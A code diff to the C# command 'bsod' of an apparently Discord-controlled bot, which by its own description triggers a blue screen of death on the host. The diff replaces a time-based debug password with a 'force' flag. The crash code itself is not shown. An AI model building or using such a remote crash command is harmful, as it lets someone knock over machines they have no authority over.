@@ -24,29 +24,17 @@ namespace Main.Source.Bot.Commands
             out uint Response
         );
 
-        private static string _debugPassword = string.Empty;
-
         public override string Name => "bsod";
         public override string Info => "Triggers the blue screen of death";
         public override string Use => "No usage";
 
         public override async Task Func(SocketCommandContext socket, string[] args)
         {
-            if (ConfigMisc.DEBUG_MODE)
+            string arguments = string.Join(" ", args);
+            if (ConfigMisc.DEBUG_MODE && !Utilities.Parser.GetFlag(arguments, "force"))
             {
-                if (string.IsNullOrEmpty(_debugPassword))
-                {
-                    _debugPassword = DateTime.Now.ToString("HH:mm:ss").Replace(":", "");
-
-                    await socket.Message.ReplyAsync($"Debug: rerun command with argument \"{_debugPassword}\"");
-                    return;
-                }
-
-                if (args.Length == 0 || args[0] != _debugPassword)
-                {
-                    await socket.Message.ReplyAsync($"Debug: rerun command with argument \"{_debugPassword}\"");
-                    return;
-                }
+                await socket.Message.ReplyAsync($"Cannot run command while in debug mode without force flag");
+                return;
             }
 
             bool prev = false;
